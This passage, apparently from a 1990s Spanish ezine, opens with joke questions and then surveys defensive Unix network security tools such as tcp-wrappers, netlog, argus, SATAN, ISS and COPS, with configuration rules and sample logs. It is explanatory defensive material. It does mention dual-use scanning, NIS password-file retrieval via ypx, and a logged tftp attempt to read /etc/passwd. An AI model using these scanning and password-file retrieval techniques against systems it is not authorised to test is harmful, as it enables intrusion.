31. Si fueses a disparar a un mimo, te haria falta silenciador ?
32. Por que las bailarinas andan siempre de puntillas ? ?No seria mas 
facil contratar bailarinas mas altas ?
33. A una nave espacial que esta viajando a la velocidad de la luz, le 
funcionan los faros ?
34. Un esquizofrenico paranoico tiene miedo de estar persiguiendose?


ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ




			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			#					     #
       	      # 7.-Seguridad en Redes y Sistemas #
			#					     #	
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



__________________________________________________________ By Francisco Cruz A.


Introducción

En este artículo se intenta describir de forma resumida algunas herramientas que 
pueden ayudar a mejorar el nivel de seguridad de una red integrada en Internet 
así como los sistemas que lo forman. Últimamente ha aparecido un gran número de
herramientas de seguridad, para este artículo se han elegido las que parecían 
más representativas, aunque puede haber otras que es posible sean más útiles 
dependiendo de la funcionalidad que se les quiera dar. Todas las herramientas 
descritas han sido instaladas y algunas de ellas están en funcionamiento de forma 
continua en la Universidad Carlos III de Madrid.

Dividiremos las herramientas existentes en dos tipos: aquellas que nos alertan 
de conexiones no deseadas y que nos permiten hacer un seguimiento de éstas, así 
como poder decidir sobre qué conexiones permitimos y cuales no (herramientas de 
control y seguimiento de accesos), y aquellas que se centran más en la seguridad 
del sistema (herramientas que chequean la integridad del sistema), para detectar 
una vez que el sistema ha sido asaltado el alcance de los posibles daños. 

Todas las herramientas de este documento son de dominio público y se encuentran 
en multitud de servidores de ftp anónimo y www.


1.- Herramientas de control y seguimiento de accesos

En este apartado se encuentran aquellas herramientas que nos permitirán tener una 
información (mediante ficheros de trazas) de todos los intentos de conexión que se 
han producido sobre ese sistema o sobre otro que nosotros hayamos señalado, así como
intentos de ataque de forma sistemática a puertos tanto de TCP como de UDP 
(herramientas de tipo SATAN). Este tipo de herramientas nos permite tener un control 
sobre todos los paquetes que entran por el interfaz de red de la máquina: IP (TCP,
UDP) e ICMP, o analizando paquetes a nivel de aplicaciones (TELNET, FTP, SMTP, LOGIN,
SHELL...). Estas herramientas pueden ser utilizadas junto con otras que nos permitan
definir desde qué máquinas permitimos ciertas conexiones y de cuales se prohiben. 
Algunas de las herramientas descritas en este apartado no necesitan estar instaladas 
en la máquina que se quiere controlar (ya que se puede poner en una máquina cuyo 
interfaz de red funcione en modo promiscuo, permitiendo seleccionar la dirección 
IP o máquina que queremos auditar).

Algunas de las herramientas descritas en este apartado pueden tener un doble uso, es 
decir nos permiten protegernos ante posibles ataques, pero también podrían ser 
utilizadas para intentar comprometer los sistemas. Por eso es importante que el uso
de estas herramientas esté restringido (en la manera que se pueda) para que no todo 
el mundo esté utilizándolas de forma aleatoria y nos oculten realmente un ataque. 
También podrán ser utilizadas para hacer seguimientos en la red cuando creamos que 
alguna de nuestras máquinas ha sido comprometida.

Las herramientas que permiten este tipo de operatividad son: tcp-wrapper, netlog, 
argus, tcpdump, SATAN, ISS,courtney, gabriel, nocol, tcplist.

1.1.- tcp-wrappers

El tcp-wrappers es un software de domino público desarrollado por Wietse Venema 
(Universidad de Eindhoven, Holanda). Su función principal es proteger a los sistemas 
de conexiones no deseadas a determinados servicios de red, permitiendo a su vez
ejecutar determinados comandos ante determinadas acciones de forma automática.

Con este paquete podemos monitorizar y filtrar peticiones entrantes a distintos 
servicios TCP-IP, como: SYSTAT, FINGER, FTP, RLOGIN, RSH, REXEC, TFTP, TALK. El 
software está formado por un pequeño programa que se instala en el "/etc/inetd.conf". 
Una vez instalado, se puede controlar los accesos (mediante el uso de reglas) y dejar 
una traza de todos los intentos de conexión tanto admitidos como rechazados (por servicios
, e indicando la máquina que hace el intento de conexión).

Veamos primero el tema de las trazas que genera este software. El programa utiliza 
el syslogd (puerto 514 udp) para mandar esa información; por defecto utilizará la 
salida de mail, la cual estará indicada en el fichero de configuración de syslogd
(/etc/syslog.conf) con la línea mail.debug. Esto se puede cambiar en los fuentes 
del programa y se puede redirigir a otro lugar mediante el uso de las variables 
de usuario que deja libres el syslogd (LOCAL_0,...LOCAL_7, estas variables vienen
definidas en el fichero /usr/include/syslog.h). Una vez modificados los fuentes, 
se deberá indicar al syslogd donde debe dejar la información de esa variable local. 

En referencia al control de conexiones a distintos servicios, el software utiliza 
dos ficheros de información (hosts.allow,hosts.deny) situados en el directorio 
"/etc". En estos ficheros es donde se le definirán las reglas que debe utilizar 
para el filtrado de los paquetes. El filtrado se puede realizar teniendo en cuenta 
tanto a máquinas como a servicios o una mezcla de ambos. En el caso de las máquinas 
hay varias formas de hacerlo, por ejemplo se le puede indicar que sólo se conecten 
las máquinas pertenecientes al mismo dominio (esto se puede ampliar a los que tengan 
el mismo rango de direcciones IP, para evitar que máquinas no definidas en el DNS 
no puedan conectarse), o sólo aquellas cuyos nombres sean especificados de forma 
explícita.
Veamos un ejemplo que consiste en permitir las conexiones sólo de aquellas máquinas 
de mi dominio. Para ellos tendríamos que tener lo siguiente:



                        hosts.deny

                                ALL: ALL

                        hosts.allow

                                ALL: LOCAL, .uc3m.es


La secuencia es la siguiente: en el primer fichero denegamos todas las conexiones; 
mientras que en el segundo, permitimos las conexiones de las máquinas definidas en 
mi mismo dominio.

Una utilidad que puede ser interesante a la hora de tener información de conexiones 
de forma automática es el uso de comandos en estos ficheros. Es decir, podemos decirle 
al programa que cuando se produzcan ciertas conexiones ejecute un comando. 
Veamos un ejemplo:



hosts.deny

        ALL: ALL (/usr/ucb/finger -l @%h | /usr/ucb/mail -s %d%h e-mail) &

hosts.allow

        ALL: LOCAL, uc3m.es


En este ejemplo, cuando se produzca una conexión no deseada, de forma automática 
se ejecutará un finger a la máquina que origine esa conexión y el resultado 
(del finger) se mandará vía correo electrónico al usuario especificado (el 
administrador de la máquina o el responsable de seguridad de la organización), 
indicando en el "subject" del mensaje el servicio intento de conexión y la máquina 
que lo originó, y como cuerpo el resultado del finger sobre esa máquina.

Además de estas reglas podemos incluir protocolos específicos de control, veamos un 
pequeño ejemplo de esta utilidad.



                        hosts.deny

                                ALL: ALL

                        hosts.allow

                                in.ftpd: LOCAL, .uc3m.es


En este ejemplo sólo permitimos conexiones ftp desde nuestro dominio, prohibiendo 
las demás conexiones que estén filtradas por el programa. Estos ejemplos son muy 
básicos, pero el grado de complejidad de las reglas puede aumentar incluyendo distintos 
protocolos y listas de máquinas por protocolos. 

Como decíamos anteriormente este tipo de programa genera trazas de las conexiones 
establecidas. Veremos a continuación unas recomendaciones referentes a las trazas 
que pueden extenderse a otro tipo de utilidades.

Es aconsejable disponer de una o varias máquinas para centralizar las trazas que 
creamos convenientes. Describiremos ahora una posible organización para tener 
información de todas las conexiones que se producen en nuestro grupo de máquinas.
Podemos clasificar nuestras máquinas por sistema operativo o por funciones que realizan.
A cada uno de estos grupos se le asigna una variable en el syslog (como veíamos 
anteriormente), y se envía (vía syslog) a una o varias máquinas (cuya finalidad
es que tengan todas las conexiones que se produzcan en tiempo real). El disponer de 
varias máquinas de este tipo es muy útil ya que los hackers suelen correr programas 
del tipo "zap", que borran las huellas en el sistema asaltado, y este tipo de herramienta 
(tcp-wrapper) que deja las trazas en un fichero tipo texto, sería muy fácil su modificación 
editando el fichero con el "vi" para eliminar las huellas. 

De hecho esto puede ser una pista de que un sistema ha sido asaltado (es decir, el que
los ficheros de trazas relativos a una máquina sean distintos en la máquina que lo 
originan y en las máquinas que lo centralizan). Debemos tener en cuenta que las máquinas 
que centralizan esta información deben estar muy protegidas ante los posibles ataques.

Para terminar podemos decir que el tcp-wrappers es una simple pero efectiva herramienta 
para controlar y monitorizar la actividad de la red en nuestra máquina, y nos permite 
un control sobre las conexiones que se efectúan a nuestra red. 

Veamos un pequeño ejemplo del fichero de trazas que genera este software.



        May 29 13:21:22 lince.uc3m.es in.ftpd[237]: connect from acme.uc3m.es

        May 29 13:52:00 lince.uc3m.es in.ftpd[557]: connect from acme.uc3m.es

        May 29 13:54:21 lince.uc3m.es in.telnetd[561]: connect from acme.uc3m.es

        May 29 14:50:20 lince.uc3m.es in.ftpd[8228]: refused connect from acme.uc3m.es

        May 29 14:51:12 lince.uc3m.es in.ftpd[8232]: connect from acme.uc3m.es

        May 29 14:57:33 lince.uc3m.es in.ftpd[8275]: connect from acme.uc3m.es

        May 29 15:09:25 lince.uc3m.es in.telnetd[8631]: connect from acme.uc3m.es

        May 29 15:35:34 lince.uc3m.es in.ftpd[8729]: connect from acme.uc3m.es

        May 29 15:43:17 lince.uc3m.es in.ftpd[8754]: connect from acme.uc3m.es

        Jul 25 13:47:45 lince.uc3m.es in.telnetd[338]: refused connect from acme.uc3m.es

        Jul 25 13:48:16 lince.uc3m.es in.telnetd[351]: refused connect from acme.uc3m.es

        Aug  7 10:20:27 lince.uc3m.es in.telnetd[3457]: connect from acme.uc3m.es

        Sep 22 12:09:29 lince.uc3m.es in.telnetd[19795]: connect from acme.uc3m.es

        Oct  2 09:43:03 lince.uc3m.es in.telnet[10836]: refused connect from arwen.uc3m.es

        Oct  5 07:32:15 lince.uc3m.es in.telnet[2554]: refused connect from elrond.uc3m.es

        Oct 10 17:51:18 lince.uc3m.es in.telnet[6959]: refused connect from arwen.uc3m.es




1.2.- Netlog

Este software de dominio público diseñado por la Universidad de Texas, es una herramienta 
que genera trazas referentes a servicios basados en IP (TCP, UDP) e ICMP, así como tráfico
en la red (los programas pueden ejecutarse en modo promiscuo) que pudiera ser "sospechoso"
y que indicara un posible ataque a una máquina (por la naturaleza de ese tráfico). 

El paquete está formado por el siguiente conjunto de programas: 

1.2.1.- tcplogger

Este programa escucha todos los servicios sobre TCP, dejando una traza de cada servicio 
en un fichero de trazas, indicando la hora, la máquina origen u y el puerto de esa conexión
...Veamos un pequeño ejemplo de un fichero originado por este programa:



 
        04/25/95 14:23:50 6C016A00 arapaima.uc3m.es      1153 - acme           telnet

        04/25/95 14:29:50 4D444600 elrond                3865 - acme           smtp

        04/25/95 14:35:30 39665600 svin09.win.tue.nl     ftp-data - acme        2527

        04/25/95 14:53:26 18DB4800 ordago                3268 - acme           smtp

        04/25/95 14:54:49 58ECA600 elrond                3880 - acme           smtp

        04/25/95 14:59:58 399B7801 siuX                  1529 - acme           telnet

        04/25/95 15:27:27 4562B200 sun.rediris.es        1617 - acme           domain

        04/25/95 16:15:20 DE069664 pc_jj                 1048 - acme           telnet

        04/25/95 16:31:54 35C98800 nazgul                3215 - acme           domain

        04/25/95 16:32:29  D87DE00 sauron                2038 - acme            domain

        04/25/95 16:33:23  F760200 a16-unix              1200 - acme            domain

        04/25/95 16:49:35 707E1A04 info.tamu.edu         ftp-data - acme        2536

        07/05/95 14:24:18 34874400 elrond                4636 - acme           smtp

        07/05/95 15:02:44  FBB5800 arapaima.uc3m.es      ftp-data - acme       1545

        07/05/95 16:19:48 53C64A00 grande                2271 - acme            domain

        07/05/95 17:36:40 4D09AE00 elrond                1112 - acme           smtp

        07/05/95 17:55:53 2D816A00 chico.rediris.es      4499 - acme           domain

        07/05/95 18:23:50 3DF64E01 selene.uc3m.es        1443 - acme            domain

        07/05/95 18:57:21  A613A00 elrond                1149 - acme           smtp

        09/13/95 14:44:51 4C5FC201 saruman               1023 - acme           printer

        09/13/95 14:45:02 4C60BC01 saruman               1023 - acme            printer

        09/13/95 17:03:02 7603EA00 sauron                1230 - acme           domain

        09/13/95 17:04:37 95720601 fivos                 1825 - acme           domain

        09/13/95 17:08:28 18315C00 nazgul                2835 - acme           domain

        09/13/95 17:22:12 786C2000 sauron                1252 - acme           domain



1.2.2.- udplogger

Es semejante al anterior pero para los servicios sobre UDP. 
Un ejemplo del fichero de trazas:



 
        10/23/95 11:25:04        0 d.root-servers.net    domain - acme         domain

        10/23/95 11:25:05        0 elrond                1659 - acme           domain

        10/23/95 11:25:05        0 elrond                1660 - acme           domain

        10/23/95 11:25:05        0 crl.dec.com           domain - acme         domain

        10/23/95 11:25:06        0 acme                  4083 - acme           domain

        10/23/95 11:25:06        0 acme                  4084 - acme           domain

        10/23/95 11:25:06        0 darkstar.isi.edu      domain - acme         domain

        10/23/95 11:25:06        0 acme                  4087 - acme           domain

        10/23/95 11:25:06        0 acme                  4088 - acme           domain

        10/23/95 11:25:07        0 sladw.arl.mil         domain - acme         domain

        10/23/95 11:25:09        0 gw.home.vix.com       domain - acme         domain

        10/23/95 11:25:10        0 ns-too.ripe.net       domain - acme         domain

        10/23/95 11:25:10        0 relay.bt.net          domain - acme         domain

        10/23/95 11:25:32        0 ns.mci.net            domain - acme         domain

        10/23/95 11:25:32        0 nazgul                1030 - acme           syslog

        10/23/95 11:25:33        0 ordago                3661 - acme           domain

        10/23/95 11:25:33        0 0.0.0.0               68 - 255.255.255.255  67

        10/23/95 11:25:51        0 zenon                 4435 - acme           domain

        10/23/95 11:25:51        0 zenon                 4436 - acme           domain

        10/23/95 11:25:54        0 vgr.arl.mil           domain - acme         domain



Los ficheros que generan estas dos herramientas pueden ser útiles también para 
detectar ataques de tipo SATAN o ISS, ya que en los ficheros de trazas se 
aprecian intentos de conexión muy cortos en el tiempo a puertos (tcp o udp) 
de forma consecutiva.

1.2.3.- icmplogger

Se encarga de trazar el tráfico de icmp. Veamos un ejemplo del fichero de trazas:




        10/23/95 11:24:08        0 elrond                - acme                portunreach

        10/23/95 11:25:05        0 ES-s3.dante.bt.net    - acme                hostunreach

        10/23/95 11:25:05        0 elrond                - acme                portunreach

        10/23/95 11:25:39        0 elrond                - acme                portunreach

        10/23/95 11:26:25        0 163.117.138.60        - acme                portunreach

        10/23/95 11:26:26        0 pc-11-58              - acme                portunreach

        10/23/95 11:26:45        0 arpa-gw.hpc.org       - acme                hostunreach

        10/23/95 11:27:17        0 ES-s3.dante.bt.net    - acme                hostunreach

        10/23/95 11:27:18        0 192.157.65.82         - acme                hostunreach

        10/23/95 11:27:41        0 elrond                - acme                portunreach

        10/23/95 11:28:16        0 elrond                - acme                portunreach

        10/23/95 11:28:16        0 arpa-gw.hpc.org       - acme                hostunreach

        10/23/95 11:28:22        0 elrond                - acme                portunreach

        10/23/95 11:28:26        0 192.157.65.82         - acme                hostunreach

        10/23/95 11:28:51        0 192.157.65.82         - acme                hostunreach

        10/23/95 11:29:05        0 192.157.65.82         - acme                hostunreach

        10/23/95 11:29:46        0 arpa-gw.hpc.org       - acme                hostunreach



Estos programas pueden guardar su información en ASCII o en formato binario, en este 
segundo caso el programa dispone de una herramienta (extract) que permite consultar 
los ficheros de trazas dándole patrones de búsqueda, como pueden ser tráfico desde 
una red concreta, intentos de conexión a puertos específicos, etc.

1.2.4.- etherscan

Es una herramienta que monitoriza la red buscando ciertos protocolos con actividad 
inusual, como puedan ser conexiones tftp(en este caso si se han realizado con éxito 
nos indica qué ficheros se han llevado), comandos en el puerto de sendmail (25
tcp) como vrfy, expn, algunos comandos de rpc como rpcinfo, peticiones al servidor 
de NIS (algunas herramientas utilizan este tipo de servidores para obtener el fichero 
de password, ej: ypx), peticiones al demonio de mountd, etc. Etherscan se
ejecuta en modo promiscuo en la máquina utilizando (al igual que las anteriores) el 
NIT (Network Interface Tap de SunOs 4.1.x), y también el "Packet Filtering Interface" 
para realizar esas capturas. Veamos al igual que en los casos anteriores un ejemplo de 
fichero de trazas:




        04/25/95 14:32:29 [rpc]  pc_12B14B.uc3m.es.1500 acme RPC lookup for: pcnfsd
        04/25/95 14:32:29 [rpc]  pc_12B14B.uc3m.es.1501 acme RPC lookup for: pcnfsd
        04/25/95 16:05:57 [rpc]  tony.1500 acme RPC lookup for: ypserv
        04/25/95 16:06:01 [rpc]  tony.1502 acme RPC lookup for: ypserv
        05/05/95 12:26:52 [tftp] router4.61892 acme Attempt to write `/tftpboot/L1'.
        05/05/95 12:26:56 [tftp] router4.61892 acme Attempt to write `/tftpboot/L1'.
        05/08/95 09:50:56 [smtp] arapaima.uc3m.es.1033 acme vrfy jose@acme
        05/09/95 17:53:34 [rpc]  paco.1501 acme RPC lookup for: pcnfsd
        05/10/95 10:38:16 [smtp] saruman.1339 selene.uc3m.es unknown cmd: hello selene
        05/11/95 16:26:00 [rpc]  balleste.1500 acme RPC lookup for: pcnfsd
        05/11/95 17:30:26 [smtp] bruno.cs.colorado.edu.4671 elrond EXPN rivera
        05/11/95 19:58:22 [smtp] mudhoney.micro.umn.edu.1808 elrond EXPN cloquell
        05/17/95 14:47:44 [smtp] elrond.2725 tidos.tid.es vrfy jason
        05/17/95 15:27:31 [tftp] master.etsit.upm.es.1918 elrond Attempt to read`/etc/passwd'.
        05/19/95 09:22:17 [rpc]  paco.1501 acme RPC lookup for: ypserv
        05/19/95 09:32:31 [smtp] tornasol.2748 acme vrfy jose
        05/19/95 09:32:53 [smtp] tornasol.2748 acme vrfy jose@di
        05/19/95 09:33:10 [smtp] tornasol.2748 acme vrfy jose@kk
        05/26/95 09:29:13 [rpc]  pc_12B15.uc3m.es.1500 acme RPC lookup for: pcnfsd
        05/26/95 09:29:13 [rpc]  pc_12B15.uc3m.es.1501 acme RPC lookup for: pcnfsd
        09/26/95 09:32:23 [smtp] arapaima.uc3m.es.1063 elrond vrfy postmaster@uc3m.es
        09/26/95 10:02:00 [rpc]  paco.1500 acme RPC lookup for: ypserv
        09/26/95 10:02:00 [rpc]  paco.1500 acme RPC lookup for: ypserv



1.2.5.- nstat

Esta herramienta, que originariamente fue diseñada para obtener estadísticas 
de uso de varios protocolos, se puede utilizar para detectar cambios en los 
patrones de uso de la red, que nos puedan hacer sospechar que algo raro está 
pasando en la misma . Esta herramienta viene acompañada por dos utilidades que 
nos permiten analizar la salida que origina nstat, a saber: nsum, nload. 
La primera de ellas nos da información de ciertos periodos de tiempo, el segundo 
es un programa awk que produce una salida que puede ser vista de forma gráfica 
por herramientas como xvgr.

Para concluir este apartado podemos decir que esta herramienta es muy útil para 
detectar ciertos tipos de ataques, como hemos reflejado anteriormente (con etherscan),
así como dar una idea de qué tipo de protocolos están viajando por la red.
Además tiene la ventaja que al estar en modo promiscuo, con solo tenerlo en una 
máquina del segmento se puede tener monitorizado todo el segmento en el que esté conectada.

1.3.- argus

Es una herramienta de dominio público que permite auditar el tráfico IP que se 
produce en nuestra red, mostrándonos todas las conexiones del tipo indicado que 
descubre. Este programa se ejecuta como un demonio y escucha directamente del 
interfaz de red de la máquina, y su salida es mandada bien a un fichero de trazas 
o a otra máquina para allí ser leída. En la captura de paquetes IP se le puede 
especificar condiciones de filtrado como protocolos específicos, nombres de máquinas,
etc. A la hora de leer esa información disponemos de una herramienta que incluye el 
software (llamado ra) y que nos permite también realizar filtros de visualización. 
Una característica de esta herramienta es la posibilidad de filtrar paquetes de acuerdo 
a las listas de acceso de los routers CISCO. Es posible por tanto decirle que nos 
capture aquellos paquetes que no cumplen las reglas de la lista de acceso definida 
para ese interfaz del router. Como en el caso anterior (netlog) es posible ejecutar 
el comando en modo promiscuo (si lo que queremos es auditar todo nuestro segmento).
Este programa divide las transacciones en cuatro grupos:

TCP, UDP/DNS, MBONE, ICMP.

Algunos ejemplos de captura pueden ser:

                        argus -w NombreFicheroTraza &

En este ejemplo le indicamos que nos capture todas la transacciones que se producen 
en nuestra subred y que lo almacene en un fichero.


                        argus -w FicheroSalida ip and not icmp &

Todo el tráfico ip pero no el icmp. 


Como decíamos antes, el ra es el programa para leer la información generada por
argus, veamos algunos ejemplos de utilización.

                        ra -r FicheroSalida tcp and host galileo


Vemos todo el tráfico tcp (tanto de entrada como salida) en la máquina galileo.

                        ra -C lista_acceso dst net 163.117.1.0

Vemos en tiempo real todas las transacciones a la red 163.117.1.0 que violan la
lista de acceso de ese interfaz del router.


Veamos a continuación un pequeño ejemplo del fichero de trazas generado por esta utilidad:



   Mon 10/23 11:25:36     ip                 router4  <-       255.255.255.255  CON
   Mon 10/23 11:31:58     ip                 router4  <-       255.255.255.255  CON
   Mon 10/23 11:24:02     udp              acme.4075   -      acme.domai TIM
   Mon 10/23 11:24:02     udp              acme.4076   -      acme.domai TIM
   Mon 10/23 11:24:02     udp              acme.4079   -      acme.domai TIM
   Mon 10/23 11:24:44     udp  leland.Stanford.domai   -      acme.domai TIM
   Mon 10/23 11:24:48     udp              acme.4081   -      acme.domai TIM
   Mon 10/23 11:24:49     udp              acme.4082   -      acme.domai TIM
   Mon 10/23 11:25:36     udp           julieta.2137   -      acme.domai TIM
   Mon 10/23 11:25:36     udp           julieta.2138   -      acme.domai TIM
   Mon 10/23 11:25:37     udp          karenina.2135   -      acme.domai TIM
   Mon 10/23 11:25:37     udp          karenina.2136   -      acme.domai TIM
   Mon 10/23 11:25:37     udp          karenina.2137   -      acme.domai TIM
   Mon 10/23 11:25:41     udp   sparky.arl.mil.domai   -      acme.domai TIM
   Mon 10/23 11:25:45     udp  serv2.cl.msu.ed.domai   -      acme.domai TIM
   Mon 10/23 11:25:12     udp  wor-srv.wam.umd.domai   -      acme.domai TIM
   Mon 10/23 11:26:04     udp          a09-unix.1359   -      acme.domai TIM
   Mon 10/23 11:25:00     udp    admii.arl.mil.domai   -      acme.domai TIM
   Mon 10/23 11:25:35     udp    sahara.upf.es.domai   -      acme.domai CON
   Mon 10/23 11:26:17     udp   sun.rediris.es.domai   -      acme.domai TIM

Para terminar podemos decir que este software está disponible para SunOs 4.1.x, 
Solaris 2.3 y SGI IRIX5.2 

1.4.- tcpdump

Es un software de dominio público que imprime las cabeceras de los paquetes que 
pasan por un interfaz de red. Este programa es posible ejecutarlo en modo promiscuo 
con lo que tendremos las cabeceras de los paquetes que viajan por la red. Tanto en
la captura como en la visualización de la información es posible aplicar filtros por 
protocolo (TCP, UDP, IP, ARP, RARP...), puertos (en este caso el puerto puede ser un 
número o un nombre especificado en el fichero/etc/services), direcciones fuente, 
direcciones destino, direcciones de red, así como realizar filtros con operadores (=,
<, , !=, and, not, ...). En la última versión es posible ver también los paquetes de
datos.

1.5.- SATAN (Security Administrator Tool for Analyzing Networks)

Es un software de dominio público creado por Dan Farmer que chequea máquinas conectadas 
en red y genera información sobre el tipo de máquina, qué servicios da cada máquina y 
avisa de algunos fallos de seguridad que tengan dichas máquinas. Una de las ventajas de 
SATAN frente a otros paquetes es que utiliza un interfaz de WWW (como Mosaic, Netscape,..) 
y va creando una base de datos de todas las máquinas chequeadas y las va relacionando 
entre ellas (de forma que si encuentra una máquina insegura, y chequea otra máquina que 
está relacionada con ésta, automáticamente quedará marcada esta segunda también como 
insegura), además tiene la posibilidad de poder chequear las máquinas con tres niveles 
("light", normal y "heavy"). Una vez realizado el chequeo de la máquina se genera una 
salida en formato html, y en el caso de encontrar fallos da una pequeña explicación 
sobre el fallo en concreto y si existe algún documento sobre ese fallo recogido en el 
CERT (advisory) tiene un enlace a ese documento, para que sobre la marcha pueda ser 
consultado. Además en el caso que el fallo de seguridad sea debido a versiones antiguas 
de software da la posibilidad (mediante un enlace) de instalar una versión de ese software.

Algunos de los servicios chequeados por SATAN son: finger, NFS, NIS, ftp, DNS, rexd 
así como tipo de sistema operativo, versión de sendmail, etc. La base de datos generada 
por SATAN puede ser luego consultada por varios campos: tipo de sistema operativo, 
tipo de servicio (servidores de NIS, ftp, NFS, X, etc).

SATAN ha sido diseñado como una herramienta de seguridad para ayudar a administradores 
de sistemas y redes, pero también puede ser utilizada para atacar a sistemas y descubrir 
la topología de la red de una organización (SATAN es capaz de chequear máquinas por subredes, 
con lo que quedan al descubierto todas las máquinas que se encuentran conectadas en dicha
subred)

Para poder compilar y ejecutar SATAN basta con poseer la versión 5 de perl y un visualizador 
de WWW.

Para terminar, vamos a ver algunos de los fallos de seguridad que SATAN es capaz de detectar:

     Acceso vía rexec
     Vulnerabilidad en el sendmail
     Acceso vía tftp
     Accesos vía rsh
     Acceso a servidores X no restringido
     Exportar sistemas de ficheros no restringido
     Acceso a ficheros de password vía NIS

1.6.- ISS(Internet Security Scanner)

Es una herramienta de dominio público que chequea una serie de servicios para comprobar 
el nivel de seguridad que tiene esa máquina. ISS es capaz de chequear una dirección IP 
o un rango de direcciones IP (en este caso se indican dos direcciones IP e ISS chequeará 
todas las máquinas dentro de ese rango). El programa viene acompañado de dos utilidades 
que son ypx y strobe, la primera nos permite la transferencia de mapas NIS a través de 
la red y la segunda nos chequea y describe todos los puertos TCP que tiene la máquina 
que chequeamos. Como podemos ver, con la primera herramienta es posible la transferencia
de los ficheros de "password" en aquellas máquinas que hayan sido configuradas como 
servidores de NIS.

ISS se puede ejecutar con varias opciones y la salida se deja en un fichero. Además, 
si ha podido traerse el fichero de "password" de la máquina chequeada creará un fichero 
aparte con la dirección IP de la máquina .

1.7.- Courtney

Este software de dominio público sirve para identificar la máquina origen que intenta 
realizar ataques mediante herramientas de tipo SATAN. El programa es un script perl 
que trabaja conjuntamente con tcpdump. Courtney recibe entradas desde tcpdump y controla 
la presencia de peticiones a nuevos servicios del stack TCP/IP (las herramientas de este 
tipo realizan ataques, chequeando de forma ordenada todos los puertos TCP y UDP que tiene 
el sistema, para poder ver qué servicios tiene instalados dicha máquina), si se detecta 
que se está produciendo un continuo chequeo de estos puertos en un breve intervalo de 
tiempo, Courtney da un aviso. Este aviso se manda vía syslog.

Courtney puede generar dos tipos de alarmas dependiendo del ataque que se esté produciendo 
(normal o "heavy", las herramientas como SATAN dispone de distintos grados de chequeo de 
la máquina).

Esta herramienta necesita el intérprete de PERL y el tcpdump.

1.8.- Gabriel

Software desarrollado por "Los Altos Technologies Inc" que permite detectar "ataques"
como los generados por SATAN . Gabriel identifica el posible ataque y de forma inmediata 
lo notifica al administrador o responsable de seguridad. La notificación se puede realizar 
de varias formas (e-mail, cu, fichero de trazas). Este programa existe (en este momento) 
para SunOs 4.1.x y Solaris, y está formado por un cliente y un servidor. El cliente se 
instala en cualquier máquina de la red, recoge la información que se está produciendo y 
la envía al servidor vía syslog. Estos clientes además envían de forma regular información 
al servidor para indicarle que están en funcionamiento.

Gabriel en el caso de SunOs 4.1.x (Solaris 1) utiliza el programa etherfind para realizar
su trabajo. Una característica interesante de este software es que no necesita programas 
adicionales (como en el caso anterior PERL y tcpdump). El software viene con los ejecutables 
para SunOs 4.1.x y Solaris (cliente y servidor) así como un programa para realizar un test
de funcionamiento.

Veamos un ejemplo de una alerta generada por el programa ante un ataque con SATAN. 
Además de este fichero, se genera un mensaje de correo alertando del ataque.


        Mon 07/24/95 14:15:01 restrained attacks from acme
        Tue 07/25/95 10:15:01 restrained attacks from acme
        Tue 07/25/95 14:00:01 restrained attacks from acme

1.9.- tcplist

Es un pequeño programa de dominio público que nos informa de todas las conexiones 
TCP desde o hacia la máquina donde lo estamos ejecutando. 

1.10.- nocol (Network Operations Center On-Line)

Es un conjunto de programas de monitorización de sistemas y redes. El software es 
un conjunto de agentes que recogen información y escriben la salida en un formato 
que se puede luego procesar. Cada dato procesado recibe el nombre de evento y cada 
evento tiene asociado una gravedad. Existen cuatro niveles de gravedad (CRITICAL, 
ERROR, WARNING, INFO), cada uno de estos niveles es controlado de forma independiente 
por cada agente. Existe un conjunto de herramientas que nos permiten ver toda la 
información generada por los agentes y que puede ser filtrada dependiendo de la 
gravedad del evento. Entre las cosas que pueden ser controladas por este software 
tenemos:

     Monitor de ICMP (usando ping o multiping)
     Carga en la red (ancho de banda)
     Monitor de puertos TCP.
     Monitor de SNMP y SNMP traps.
     Monitor de servidor de Nombres.
     Monitor de rpc.
     Chequeo del bootpd

2.- Herramientas que chequean la integridad del sistema

Veremos a continuación una serie de herramientas que nos ayudarán a proteger nuestro 
sistema. Para conseguirlo tenemos dos tipos de herramientas. Las primeras se basan en 
chequeos a los ficheros y las segundas nos alertan de posibles modificaciones de ficheros,
y, de programas "sospechosos" que puedan estar ejecutándose en la máquina de forma 
camuflada. Veremos primero las que chequean la integridad de los sistemas de ficheros.

2.1.- COPS (Computer Oracle and Password System)

Cops es un conjunto de programas diseñados por la Universidad de Purdue que chequean 
ciertos aspectos del sistema operativo UNIX relacionados con la seguridad. Existen dos 
versiones de este paquete: una versión escrita en "sh" y "C" y otra versión escrita en 
"perl", aunque su funcionalidad es similar. Este programa es fácil de instalar y configurar 
y se ejecuta en gran cantidad de plataformas UNIX. En el primer caso necesitaremos un 
compilador de lenguaje C y una shell estándar (sh), en el segundo nos bastará con tener 
instalado el interprete de perl (versión 3.18 o superior). Entre las funcionalidades que 
tiene Cops podemos destacar.

     Chequeo de modos y permisos de los ficheros, directorios y dispositivos
     Palabras de paso pobres (en el caso que tengamos una herramienta como crack, 
     podemos comentar la línea de chequeo de palabras de paso)
     Chequeo de contenido, formato y seguridad de los ficheros de "password" y "group"
     Chequeo de programas con root-SUID.
     Permisos de escritura sobre algunos ficheros de usuario como ".profile" y ".cshrc"
     Configuración de ftp "anonymous".
     Chequeo de algunos ficheros del sistema como "hosts.equiv", montajes de NFS sin 
     restricciones, "ftpusers", etc.

Veamos un ejemplo del fichero creado por este programa:


        ATTENTION:

        Security Report for Tue Apr 11 13:33:33 WET DST 1995
        from host acme
        Warning!  Root does not own the following file(s):
        /dev /usr/etc
        Warning!  NFS file system  exported with no restrictions!
        Warning!  NFS file system  exported with no restrictions!
        Warning!  NFS file system  exported with no restrictions!
        Warning!  /dev/fd0 is _World_ writable!
        Warning!  /dev/fd0 is _World_ readable!
        Warning!  /etc/ethers is _World_ writable!
        Warning!  /etc/motd is _World_ writable!
        Warning!  /etc/utmp is _World_ writable!
        Warning!  /usr/adm/snm is _World_ writable!
        Warning!  File /etc/motd (in /etc/rc.local.orig) is _World_ writable!

        Warning!  User uucp's home directory /var/spool/uucppublic is mode 03777!
        Warning!  Password file, line 12, user sysdiag has uid = 0 and is not root
